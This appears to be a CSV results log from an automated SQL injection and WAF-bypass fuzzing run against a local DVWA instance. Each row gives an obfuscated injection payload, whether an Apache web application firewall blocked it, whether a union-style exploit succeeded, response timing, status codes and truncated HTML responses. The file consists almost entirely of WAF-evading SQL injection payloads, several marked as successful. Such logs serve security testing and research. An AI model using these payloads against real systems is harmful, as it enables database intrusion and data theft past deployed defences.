Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@!=1.%0b||+not%0b1=%0b(0)+or',Bypassed,No,None,Invalid,0.0669,73.78,No,500,
0'<@=1.+or+not%0b{x%0b(select+1)}=1=%0b(not%0b{`if`+1}=1)+,Bypassed,No,None,Invalid,0.019,73.78,No,500,
0%27<@=.1+||+!+true=+(not%0b{x+(select+1)}=1)+or',Bypassed,No,None,Invalid,0.0143,73.78,No,500,
0%27<@!=1%0bor+!+{x%0b(select%0b1)}=1=+(not%0b{`if`%0b1}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.046,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+||%0bnot+{`if`+1}=1=+(!+{x%0b(select+1)}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0267,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+||%0b!+{x%0b(select%0b1)}=1=%0b(not+{x%0b(select+1)}=1),Bypassed,No,None,Invalid,0.0202,73.78,No,500,
0'<@!=.1+||%0b!+{x%0b(select+1)}=1=+(!+{x+(select+1)}=1),Bypassed,No,None,Invalid,0.0467,73.78,No,500,
0'<@=.1%0bor%0bnot%0b{x+(select%0b1)}=1=+(not+{`if`+1}=1)--,Bypassed,No,None,Invalid,0.0391,73.78,No,500,
0'<@!=1.%0b||+!+{`if`+1}=1=%0b(false)+||%27,Bypassed,No,None,Invalid,0.0494,73.78,No,500,
0%27<@=1.+||+not+{`if`+1}=1=+(not+1)+||',Bypassed,No,None,Invalid,0.0545,73.78,No,500,
0%27<@=1%0bor+not%0b{x+(select%0b1)}=1=%0b(0)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0339,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0b||+!%0b{`if`+1}=1=%0b(not%0b{a+1}=1)+or%27,Bypassed,No,None,Invalid,0.0565,73.78,No,500,
0'<@!=.1+or%0b!~false=+(!%0b{x+(select+1)}=1)%0bor%27,Bypassed,No,None,Invalid,0.058,73.78,No,500,
0%27or+1<@.+or%0b{x+(select+1)}=1%0blike+{x%0b(select+1)}=1%0b||',Blocked,No,None,Invalid,0.0474,73.78,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1+or+not+{a%0b1}=1=+(!%0b{x+(select+1)}=1)%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0257,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0bor+not+{x%0b(select+1)}=1=%0b(!%0b{x+(select+1)}=1,Bypassed,No,None,Invalid,0.0284,73.78,No,500,
0%27<@!=1.%0bor+!+{x+(select%0b1)}=1=%0b(!%7efalse)+or',Bypassed,No,None,Invalid,0.0691,73.78,No,500,
0%27<@=1.%0b||%0bnot%0b{x%0b(select%0b1)}=1=+(not+{x%0b(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0275,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or+not%0b{x%0b(select+1)}=1=%0b(!%0b{`if`%0b1}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0229,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0b||+{x%0b(select%0b1)}=1%0blike+{x+(select%0b1)}=1+or',Bypassed,No,None,Invalid,0.0189,73.78,No,500,
0'<@!=1+||%0bnot+{`if`+1}=1=+(!+1)+or%27,Bypassed,No,None,Invalid,0.0485,73.78,No,500,
0%27<@!=1+||+!%7efalse=%0b(not+{`if`+1}=1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0122,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or+not%0b{x+(select+1)}=1=%0b(not+1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.026,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0b||+!%0btrue=+(not%0b{a+1}=1)%0b||',Bypassed,No,None,Invalid,0.0298,73.78,No,500,
0%27<@=.1+or+!+{a+1}=1=+(not%0b{a+1}=1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0293,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||+not%0b{x+(select+1)}=1=+(!+{`if`+1}=1)%0b,Bypassed,No,None,Invalid,0.0398,73.78,No,500,
0%27<@!=1+or+!+{x%0b(select%0b1)}=1=+(0)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0252,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+||+not%0b{x+(select+1)}=1=+(not%0b{x+(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0619,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or%0b!+{x%0b(select+1)}=1=%0b(not%0b{`if`+1}=1)%0b,Bypassed,No,None,Invalid,0.0218,73.78,No,500,
0%27<@!=1.%0b||+not%0b1=%0b(!%0btrue)+or',Bypassed,No,None,Invalid,0.0622,73.78,No,500,
0%27<@=.1+or+!~false=%0b(not~0)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0402,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or+not+{x+(select+1)}=1=+(not%0b{`if`%0b1}=1)%0b,Blocked,No,None,Invalid,0.0255,73.78,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1+or%0bnot+{x%0b(select+1)}=1=+(!%7efalse)%0b||',Bypassed,No,None,Invalid,0.0334,73.78,No,500,
0%27<@=1%0b||+!%0b{`if`+1}=1=%0b(not+{x+(select+1)}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0347,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or%0b!%0b{x%0b(select+1)}=1=+(not+1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0504,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'or+1<@+or%0b!%7e0=+(not%0b{x+(select+1)}=1)+,Blocked,No,None,Invalid,0.0202,73.78,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1+or%0bnot%7efalse=+(0)+or',Bypassed,No,None,Invalid,0.0546,73.78,No,500,
0'<@=.1%0b||+{a+1}=1+like%0b{x+(select%0b1)}=1+or%27,Bypassed,No,None,Invalid,0.0535,73.78,No,500,
0%27<@!=.1%0bor+not+1=+(!%0b1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0277,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+or+not%0b{x%0b(select+1)}=1=+(not%0b1)+||%27,Bypassed,No,None,Invalid,0.0366,73.78,No,500,
0%27<@!=1%0bor%0b!%0b{x%0b(select+1)}=1=+(!%0b{x+(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0324,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+||+not%0b{x%0b(select%0b1)}=1=%0b(not+{`if`+1}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.033,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor+not+{x+(select+1)}=1=%0b(!+{x%0b(select%0b1)}=1),Bypassed,No,None,Invalid,0.0329,73.78,No,500,
0'<@!=1.+||+{a%0b1}=1+like%0b{`if`+1}=1%0bor%27,Bypassed,No,None,Invalid,0.0492,73.78,No,500,
0%27<@!=1+or+!%7efalse=%0b(!+{x%0b(select%0b1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0301,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+or+!%0b{x+(select+1)}=1=%0b(not%0b{`if`%0b1}=1)%0b,Bypassed,No,None,Invalid,0.0244,73.78,No,500,
0%27<@=1.+||+!+{x+(select+1)}=1=%0b(!%0b{`if`+1}=1)--,Blocked,No,None,Invalid,0.0086,73.78,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1+or%0b!+{a+1}=1=+(not+true)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0406,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0b||+!+{`if`+1}=1=+(!%7efalse)%0b||',Bypassed,No,None,Invalid,0.0197,73.78,No,500,
0%27<@!=1%0b||+not+{x+(select%0b1)}=1=+(!%0b1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0353,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+||%0bnot%0b{x+(select+1)}=1=%0b(!+{`if`+1}=1)+,Blocked,No,None,Invalid,0.0231,73.78,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.+or%0b!%0b{a+1}=1=%0b(!+{x+(select%0b1)}=1)+,Bypassed,No,None,Invalid,0.045,73.78,No,500,
0%27<@=1%0bor+!%0b{x+(select+1)}=1=+(not%0b{x%0b(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0118,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or+not%0b{x%0b(select%0b1)}=1=+(not%0b{`if`+1}=1)%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0611,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0b||%0b!+{`if`%0b1}=1=+(!+{x+(select%0b1)}=1)%23,Bypassed,No,None,Invalid,0.0335,73.78,No,500,
0%27<@!=.1+or%0b!%0btrue=+(not%0b{`if`+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0666,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+or%0bnot+{x%0b(select+1)}=1=+(not%0btrue)+or',Bypassed,No,None,Invalid,0.0349,73.78,No,500,
0'<@=1+||+!%0b{x%0b(select%0b1)}=1=+(not%0b{a+1}=1)+,Bypassed,No,None,Invalid,0.0418,73.78,No,500,
0'<@=.1%0bor+not%0b{x%0b(select+1)}=1=%0b(!%0b{x+(select%0b1)}=1),Bypassed,No,None,Invalid,0.0476,73.78,No,500,
0%27<@=.1%0b||%0bnot+{a+1}=1=%0b(not+{x+(select%0b1)}=1)%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0374,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+or%0bnot%0b{x+(select+1)}=1=%0b(not%0b{a+1}=1)%0b,Blocked,No,None,Invalid,0.0383,73.78,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1%0b||+not~0=+(not%0b{x%0b(select%0b1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0323,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0bor%0bnot%0b{x+(select+1)}=1=%0b(not+{`if`+1}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0325,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor%0bnot%0b{a+1}=1=%0b(!%0b{`if`+1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0335,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+||+!%0b{x%0b(select%0b1)}=1=%0b(not+1)%0b||%27,Bypassed,No,None,Invalid,0.0698,73.78,No,500,
0'<@=.1+||+not%0b{x+(select+1)}=1=+(not+{x%0b(select%0b1)}=1),Bypassed,No,None,Invalid,0.0576,73.78,No,500,
0%27<@=1%0bor+not+{a+1}=1=+(not+{x%0b(select%0b1)}=1)%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0359,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or%0bnot+{x+(select+1)}=1=%0b(not+{x+(select+1)}=1),Blocked,No,None,Invalid,0.0309,73.78,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'or+@<@.%0b||+not+{a+1}=1=%0b(!%0b1)%0bor',Bypassed,No,None,Invalid,0.0495,73.78,No,500,
0%27<@!=.1%0bor+not+{`if`%0b1}=1=+(!+1)+or',Bypassed,No,None,Invalid,0.0345,73.78,No,500,
0'<@=.1+||%0b!%7e0=%0b(!+1)%0bor%27,Bypassed,No,None,Invalid,0.0191,73.78,No,500,
0'<@!=1.+or%0b!%7efalse=+(not+{x+(select+1)}=1)%0bor',Blocked,No,None,Invalid,0.0122,73.78,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'or%0b@<@.+||%0btrue+like+{x%0b(select+1)}=1%0bor%27,Bypassed,No,None,Invalid,0.0604,73.78,No,500,
0'<@=.1+||%0b!%0b1=+(not~false)%0b||%27,Blocked,No,None,Invalid,0.0259,73.78,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'or+1<@.%0bor+!+{`if`%0b1}=1=%0b(!%0b{a+1}=1)%0b,Bypassed,No,None,Invalid,0.0311,73.78,No,500,
